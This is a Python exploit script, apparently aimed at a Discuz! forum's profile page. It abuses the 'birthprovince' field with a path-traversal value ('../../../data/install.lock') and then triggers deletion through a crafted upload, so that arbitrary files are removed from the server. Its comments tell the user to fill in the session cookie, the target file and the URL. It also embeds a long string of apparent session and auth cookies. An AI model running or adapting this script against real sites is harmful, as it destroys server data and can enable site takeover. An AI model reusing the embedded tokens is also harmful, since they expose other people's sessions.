#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import re
import urllib2

def get_cookie():
    cookies={}
    for line in raw_cookies.split(';'):  
        key,value=line.split('=',1)
        cookies[key]=value 
    return cookies
def get_formhash(url):
    cookies=get_cookie()
    testurl=url+"/home.php?mod=spacecp"  
    s=requests.get(testurl,cookies=cookies)
    com = re.compile('<input type="hidden" name="formhash" value="(.*?)" />')
    result = com.findall(s.text)
    return result[0]
def del_step1(url,filename):
    headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
    geturl=url+"/home.php?mod=spacecp&ac=profile&op=base"
    formhash=get_formhash(url)
    payload ={'birthprovince':filename,"profilesubmit":1,"formhash":formhash}
    cookies=get_cookie()
    r = requests.post(geturl,data=payload,headers=headers,cookies=cookies)
    if r.content.find('parent.show_success')>0:
        print 'Step1 success!!!'
def del_step2(url):
    geturl=url+"/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa"
    heads={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
    formhash=get_formhash(url)
    files ={'formhash':(None,formhash),'birthprovince':('1.jpg',open('1.jpg','rb'),'image/jpeg'),'profilesubmit':(None,'1')}
    cookies=get_cookie()
    r=requests.post(geturl,files=files,headers=heads,cookies=cookies)
    if r.text.find('parent.show_success')>0:
        print 'Step2 success!!!'
        
if __name__ == '__main__':
    #需要修改以下三个参数：
    #1、设置cookie
    raw_cookies="KDLk_2132_saltkey=N8K92IN8; KDLk_2132_lastvisit=1529041942; KDLk_2132_sid=Nk02TO; KDLk_2132_seccode=4.c9962205b642fb914f; KDLk_2132_ulastactivity=d414n%2BRa7lVl%2Fn%2F06lqRciP3sBxmjiYq4BZK9WstbOt0XHe%2BpNPU; KDLk_2132_auth=9df5iTEVucXV60BPWGm2guEhgozOakCOU1ZpISmlzFKPsEYuqdXv%2BCADzXQ6cY%2F6GXRJ1RIpf7PXdKDcKDPZ; KDLk_2132_lastcheckfeed=2%7C1529045562; KDLk_2132_lip=60.12.13.74%2C1529045518; KDLk_2132_nofavfid=1; KDLk_2132_lastact=1529046182%09misc.php%09patch; 8rWP_2132_saltkey=TwcSBIsp; 8rWP_2132_lastvisit=1529044715; 8rWP_2132_sid=CBef9F; 8rWP_2132__refer=%252Fhome.php%253Fmod%253Dspacecp%2526ac%253Dprofile; 8rWP_2132_lastact=1529050441%09misc.php%09seccode; 8rWP_2132_seccode=6.eb6a6cb2aa6d9068f2; zj4O_2132_saltkey=PgV54Iy8; zj4O_2132_lastvisit=1529049430; zj4O_2132_sid=l5GBCN; zj4O_2132_sendmail=1; zj4O_2132_seccode=1.cbaedf401bf4e1a08f; zj4O_2132_ulastactivity=d2a6fgylrUysBI0%2BXJc3lQK%2BxwKHgOjReqeibkUpAOk0LIlMf%2BfR; zj4O_2132_auth=d2ffPCW%2BNiwwFlDDtdNH3VL1T%2FO%2FUDo1sndn9lg0NwiBH0Ko5EmzsAuCokoAfu6v5jAj8soDdq2ee48NSWcS; zj4O_2132_noticeTitle=1; zj4O_2132_lastact=1529053101%09home.php%09spacecp; zj4O_2132_checkpm=1"
    #2、设置删除的文件
    filename="../../../data/install.lock"  
    #3、设置url
    url="http://127.0.0.1"
    del_step1(url,filename)    
    del_step2(url)
